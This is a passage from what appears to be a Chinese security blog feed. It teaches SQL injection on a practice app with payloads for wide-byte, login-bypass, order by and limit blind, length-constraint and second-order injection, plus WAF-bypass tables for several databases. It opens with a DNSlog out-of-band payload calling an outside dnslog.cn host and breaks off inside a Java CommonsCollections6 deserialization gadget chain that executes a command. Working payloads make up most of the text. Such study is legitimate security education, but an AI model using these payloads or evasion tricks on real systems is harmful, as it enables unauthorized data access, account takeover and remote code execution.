href="#真正执行的-SQL-语句-4" class="headerlink" title="真正执行的 SQL 语句"></a>真正执行的 SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">=</span><span class="token string">'admin'</span> <span class="token keyword">union</span> <span class="token keyword">SELECT</span> LOAD_FILE<span class="token punctuation">(</span>CONCAT<span class="token punctuation">(</span><span class="token string">'\\\\'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.d8dzzu.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote><p>在 gbk 编码中<code>%df\</code>会被尝试识别成一个汉字</p></blockquote><h4 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h4><p>服务端使用<code>'</code> 拼接 SQL 语句，并且对其做了转义，同时 mysql 使用的编码为 gbk</p><h4 id="SQL-语句-6"><a href="#SQL-语句-6" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'{username}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="示例-6"><a href="#示例-6" class="headerlink" title="示例"></a>示例</h4><p>由于 python 会自动对 unicode 进行转码，所以这里无法模拟。直接放 payload 吧</p><h4 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'admin口'</span> <span class="token operator">or</span> sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="永真注入"><a href="#永真注入" class="headerlink" title="永真注入"></a>永真注入</h3><blockquote><p>万能密码</p></blockquote><h4 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h4><p>在登录处存在 SQL 注入</p><h4 id="SQL-语句-7"><a href="#SQL-语句-7" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> <span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token operator">=</span>{username}<span class="token string">' and `password`='</span>{password}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">username<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="真正执行的-sql-语句-1"><a href="#真正执行的-sql-语句-1" class="headerlink" title="真正执行的 sql 语句"></a>真正执行的 sql 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> <span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#' and `password`='{password}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="order-by-注入"><a href="#order-by-注入" class="headerlink" title="order by 注入"></a>order by 注入</h3><h4 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h4><p>在 order by 后存在注入点</p><h4 id="SQL-语句-8"><a href="#SQL-语句-8" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">like</span> <span class="token operator">%</span>s <span class="token keyword">order</span> <span class="token keyword">by</span> {<span class="token keyword">order</span>} {sort}<span class="token keyword">values</span><span class="token operator">=</span><span class="token punctuation">(</span>f<span class="token string">'%{username}%'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="示例-7"><a href="#示例-7" class="headerlink" title="示例"></a>示例</h4><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009185739225.png"></p><h4 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h4><p>order、sort 直接 sleep 利用时间盲注即可</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">{<span class="token string">"username"</span>:<span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"order"</span>:<span class="token string">"id,sleep(1)"</span><span class="token punctuation">,</span><span class="token string">"sort"</span>:<span class="token string">"asc"</span>}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009185835070.png"></p><blockquote><p>sleep 会受到查询条数的影响，最终 sleep 时间=指定秒数 x count(*)</p></blockquote><h4 id="真正执行的-SQL-语句-5"><a href="#真正执行的-SQL-语句-5" class="headerlink" title="真正执行的 SQL 语句"></a>真正执行的 SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">like</span> <span class="token string">'%a%'</span> <span class="token keyword">order</span> <span class="token keyword">by</span> id<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">asc</span><span class="token keyword">values</span><span class="token operator">=</span><span class="token punctuation">(</span>f<span class="token string">'%a%'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><h4 id="利用条件-6"><a href="#利用条件-6" class="headerlink" title="利用条件"></a>利用条件</h4><p>注入点在 limit 后，并且只适用于 5.0.0&lt;MySQL&lt;5.6.6</p><h4 id="SQL-语句-9"><a href="#SQL-语句-9" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">like</span> <span class="token operator">%</span>s <span class="token keyword">limit</span> {num}<span class="token keyword">values</span><span class="token operator">=</span><span class="token punctuation">(</span>f<span class="token string">'%{username}%'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="示例-8"><a href="#示例-8" class="headerlink" title="示例"></a>示例</h4><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009190304201.png"></p><h4 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 查询语句无order by</span>{<span class="token string">"username"</span>:<span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"num"</span>:<span class="token string">"1 union SELECT 1,2,sleep(2)"</span>}<span class="token comment"># 查询语句有order by</span>{<span class="token string">"username"</span>:<span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"num"</span>:<span class="token string">"1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)"</span>}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="真正执行的-SQL-语句-6"><a href="#真正执行的-SQL-语句-6" class="headerlink" title="真正执行的 SQL 语句"></a>真正执行的 SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">like</span> <span class="token string">'%a%'</span> <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">like</span> <span class="token string">'%a%'</span> <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">PROCEDURE</span> analyse<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> extractvalue<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">IF</span><span class="token punctuation">(</span><span class="token function">MID</span><span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">LIKE</span> <span class="token number">5</span><span class="token punctuation">,</span> BENCHMARK<span class="token punctuation">(</span><span class="token number">5000000</span><span class="token punctuation">,</span>SHA1<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="约束注入"><a href="#约束注入" class="headerlink" title="约束注入"></a>约束注入</h3><h4 id="利用条件-7"><a href="#利用条件-7" class="headerlink" title="利用条件"></a>利用条件</h4><p>数据库对字段长度有一定限制，如果 mysql 版本大于 5.7 插入语句使用了<code>insert ignore</code> 才会存在该问题</p><h4 id="SQL-语句-10"><a href="#SQL-语句-10" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 注册, 漏洞主要发生在这里</span><span class="token keyword">insert</span> <span class="token keyword">into</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token punctuation">(</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>password<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'{username}'</span><span class="token punctuation">,</span><span class="token string">'{password}'</span><span class="token punctuation">)</span><span class="token comment"># 登录</span><span class="token keyword">UPDATE</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">SET</span> {params} <span class="token keyword">WHERE</span> {<span class="token keyword">where</span>}<span class="token comment"># getflag</span><span class="token comment"># 判断role是否为admin</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="业务逻辑-4"><a href="#业务逻辑-4" class="headerlink" title="业务逻辑"></a>业务逻辑</h4><p>1.注册：用户提交 username，password 注册，会先判断用户是否存在，不存在才会允许注册，注册用户 role 默认为 user，username 的限制长度为 20.</p><p>2.登录：生成 token，并更新到注册的用户</p><p>3.getflag：利用 flag 查询出用户 role，如果为 admin 返回 flag</p><h4 id="示例-9"><a href="#示例-9" class="headerlink" title="示例"></a>示例</h4><p>注册</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009193050092.png"></p><p>登录</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009193117736.png"></p><p>getflag</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009193204367.png"></p><h4 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h4><p>1.注册</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"username"</span><span class="token operator">:</span> <span class="token string">"admin                1"</span><span class="token punctuation">,</span> <span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"aaa"</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时观察数据库，用户已经被注册，并且 1 由于长度约束被去掉</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009193440030.png"></p><p>2.登录</p><pre class="line-numbers language-none"><code class="language-none">{"username":"admin                ","password":"aaa"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009193519424.png"></p><p>此时观察数据库，新生成的 token 同时被写入和 admin 和我们的恶意用户</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009193614377.png"></p><p>3.getflag</p><p>攻击成功</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009193649135.png"></p><blockquote><p>可能会误以为漏洞发生在登录处，其实不然。mysql 的校对规则基于 PAD SPACE，会忽略空格，这是必然。</p><p>漏洞实际发生在登录，超过约束的长度不应该可以插入数据库。</p></blockquote><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h4 id="利用条件-8"><a href="#利用条件-8" class="headerlink" title="利用条件"></a>利用条件</h4><p>存在一处无漏洞的 insert 接口，可以将脏数据写入到数据库，等到第二次拿出数据库中的数据做操作时存在 SQL 注入漏洞，即为二次注入。</p><h4 id="SQL-语句-11"><a href="#SQL-语句-11" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 注册，无漏洞</span><span class="token keyword">insert</span> <span class="token keyword">into</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token punctuation">(</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>password<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'{username}'</span><span class="token punctuation">,</span><span class="token string">'{password}'</span><span class="token punctuation">)</span><span class="token comment"># 登录，无漏洞</span><span class="token keyword">UPDATE</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">SET</span> {params} <span class="token keyword">WHERE</span> {<span class="token keyword">where</span>}<span class="token comment"># 重置密码，存在漏洞。</span><span class="token keyword">UPDATE</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">SET</span> <span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token operator">=</span> <span class="token string">'{password}'</span> <span class="token keyword">WHERE</span> <span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token operator">=</span><span class="token string">'{username}'</span><span class="token comment"># getflag</span><span class="token comment"># 判断role是否为admin</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="业务逻辑-5"><a href="#业务逻辑-5" class="headerlink" title="业务逻辑"></a>业务逻辑</h4><p>1.注册：用户提交 username，password 注册，会先判断用户是否存在，不存在才会允许注册。</p><p>2.登录：生成 token，并更新到注册的用户</p><p>3.重置密码：利用 token 查询出 username，再 update</p><p>3.getflag：利用 flag 查询出用户 role，如果为 admin 返回 flag</p><h4 id="示例-10"><a href="#示例-10" class="headerlink" title="示例"></a>示例</h4><p>1.注册</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009233000447.png"></p><p>2.登录</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009233045648.png"></p><p>3.重置密码</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009233152812.png"></p><p>4.重新登录</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009233217550.png"></p><p>5.getflag</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009233251607.png"></p><h4 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h4><p>1.注册</p><p><code>{"username":"admin'#","password":"123"}</code></p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009233405449.png"></p><p>2.登录</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009233443697.png"></p><p>3.重置密码</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 此时执行的sql语句</span><span class="token keyword">UPDATE</span> galaxy_vuls_user <span class="token keyword">SET</span> <span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token operator">=</span> <span class="token string">'666'</span> <span class="token keyword">WHERE</span> <span class="token punctuation">`</span>username<span class="token punctuation">`</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009233509073.png"></p><p>观察数据库，admin 密码已被更改</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009233535575.png"></p><p>4.登陆 admin</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009233645854.png"></p><p>5.getflag</p><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009233706945.png"></p><h2 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h2><h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><p><code>大小写</code>、<code>双写</code>、<code>编码</code>、<code>注释</code>、<code>HPP</code>、<code>垃圾字符</code>、<code>分块传输</code>、<code>WAF特性</code></p><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><table><thead><tr><th>过滤项</th><th>绕过方式</th><th>eg</th></tr></thead><tbody><tr><td>保留关键字</td><td>内联注释</td><td><code>select 1/*!union*/select 2;</code> <br><code>/*!41320select/*!/*!10000user/*!;(/*!/*!/*!*/);</code> <br><code>select /*!user(*/);</code></td></tr><tr><td>空格</td><td>注释符、URL编码、特殊位置可省略空格(单引号后)、and/or后可跟!~-代表空格</td><td><code>select/**/user();</code><br> <code>+</code> <code>%0d</code> <code>%0a</code> <code>%09</code> <code>%0b</code> <code>%a0</code> <br><code>select(user())from(t_user);</code><br> <code>where username="test"and!!!1=1;</code></td></tr><tr><td>引号</td><td><code>hex()</code> <code>char()</code></td><td><code>where table_schema=0x74657374;</code><br> <code>where table_schema=char(116,101,115,116);</code></td></tr><tr><td>逗号</td><td><code>join</code> <code>offset</code> <code>from for</code>  <code>like</code> <code>re</code></td><td><code>select * from (select user())a join (select database())b;</code><br> <code>select * from t_user limit 1 offset 1;</code> <br><code>select substr(username from 1 for 1) from t_user;</code> <br><code>select username from t_user where username like "u%";</code> <br><code>select username from t_user where username REGEXP '^st';</code></td></tr><tr><td>等号</td><td><code>&lt;&gt;</code> <code>&lt;</code> <code>&gt;</code> <code>between</code> <code>in</code> <code>like</code> <code>regexp</code> <code>rlike</code> <code>regexp_like</code></td><td><code>select 1 between 1 and 2;</code><br><code>select 1 in (1);</code><br><code>select '123' like '1%';</code><br><code>select '123' regexp '^12.*';</code><br><code>select '123' rlike '^12.*';</code> <br><code>select regexp_like("abc","^ab");</code></td></tr><tr><td>and、or</td><td><code>&amp;&amp;</code> <code>XOR</code> <code>^</code> <code>&amp;</code>  <code>&lt;&lt;</code> <code>&gt;&gt;</code> <code>+</code> <code>-</code> <code>*</code> <code>/</code> <code>%</code> <strong>|</strong> <strong>||</strong></td><td><code>select id from vuls_user where id =1^1</code></td></tr><tr><td>括号</td><td><code>like </code> <code>regexp</code></td><td><code>select distinct table_schema from information_schema.tables where table_schema like "%%";</code><br><code>select distinct table_schema from information_schema.tables where table_schema regexp "^t.*$";</code></td></tr><tr><td>特殊字符串</td><td>如information_schema.tables</td><td>反引号：`information_schema`.`tables`<br>\n(会被当做null): informa\n\n\ntion_sch\n\n\nema.tables</td></tr><tr><td>order by</td><td><code>group by </code> <code>into</code></td><td><code>select * from user group by 1;</code><br><code>select * from user where age=111 into @a;</code></td></tr><tr><td>select</td><td><code>handler</code>    mysql8.0.19+  <code>TABLE</code> <code>values</code></td><td><code>handler user open;handler user read first;handler user read next;</code><br><code>table user;</code><br><code>values row(1,2) union select * from user;</code></td></tr></tbody></table><h3 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h3><table><thead><tr><th>过滤项</th><th>绕过方式</th><th>eg</th></tr></thead><tbody><tr><td>空格</td><td>注释、URL 编码(%0a,%0b 等)、<code>%1e</code>、MSSQL 空白符[0x00-0x20]、and/or 后可跟(<code>!</code> <code>+</code> <code>--</code> <code>.</code> <code>/</code> <code>~</code>)。参数和 union 之间可以使用浮点数、1e0、运算符。union 和 select 之间使用冒号。select 和后续参数之间可以使用<code>.</code> <code>~</code>等</td><td><code>select * from test where id=1 union:select 1,'2',db_name() from test;</code> <br><code>select * from test where id=1 union select.1,'2',db_name() from test;</code><br></td></tr><tr><td>等号</td><td><code>&lt;&gt;</code> <code>&lt;</code> <code>&gt;</code> <code>between</code> <code>in</code> <code>like</code></td><td></td></tr></tbody></table><h3 id="oracle"><a href="#oracle" class="headerlink" title="oracle"></a>oracle</h3><p>和 mssql 基本相同</p><h3 id="postgresql"><a href="#postgresql" class="headerlink" title="postgresql"></a>postgresql</h3><table><thead><tr><th>过滤项</th><th>绕过方式</th><th>eg</th></tr></thead><tbody><tr><td>空格</td><td>注释、URL 编码、%0a、%0b、%0d 等</td><td></td></tr><tr><td>单引号</td><td><code>$$</code> <code>$quote</code> <strong>||</strong></td><td>select $$1$$<br>select $quote$1$quote$<br>select chr(97)｜｜ chr(98);</td></tr><tr><td>等号</td><td><code>&lt;&gt;</code> <code>between</code> <code>like</code> <code>SIMILAR TO 正则匹配</code> <code>POSIX正则匹配</code></td><td>select ‘abc’ SIMILAR TO ‘%a%’;<br>select ‘abc’ ~ ‘abc’;</td></tr></tbody></table><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/01.SQL%E6%B3%A8%E5%85%A5">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/01.SQL%E6%B3%A8%E5%85%A5</a></p><p><a href="https://bak.gm7.org/pentestmonkey.net/category/cheat-sheet/sql-injection.html">https://bak.gm7.org/pentestmonkey.net/category/cheat-sheet/sql-injection.html</a></p><p><a href="https://sqlwiki.netspi.com/">https://sqlwiki.netspi.com/</a></p><p><a href="https://xz.aliyun.com/t/10373">https://xz.aliyun.com/t/10373</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 常规Web漏洞 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-sec: 04. cc6</title>
      <link href="/2022/07/16/java-sec-04-cc6/"/>
      <url>/2022/07/16/java-sec-04-cc6/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonCollections6"><a href="#CommonCollections6" class="headerlink" title="CommonCollections6"></a>CommonCollections6</h1><p>无条件限制，JDK全版本通用。</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//1</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"calc.exe"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token 